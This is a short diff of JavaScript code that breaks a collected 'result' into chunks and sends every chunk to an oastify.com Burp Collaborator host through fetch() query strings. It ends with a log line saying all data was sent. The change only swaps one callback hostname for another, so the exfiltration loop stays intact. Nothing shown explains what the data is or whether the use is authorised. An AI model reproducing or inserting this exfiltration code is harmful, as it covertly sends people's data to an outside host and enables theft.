@@ -36,7 +36,7 @@
     const chunkSize = 1900;
     for (let i = 0; i < result.length; i += chunkSize) {
       const part = result.slice(i, i + chunkSize);
-      await fetch(`https://4nspmfwzis40b92tl1wdw2ngy74yspxdm.oastify.com?data=${encodeURIComponent(part)}`);
+      await fetch(`https://ffyv5sxym8fbiwkpvkgkgjevvm1dp4tsi.oastify.com?data=${encodeURIComponent(part)}`);
     }
 
     console.log("All data sent to Burp Collaborator");
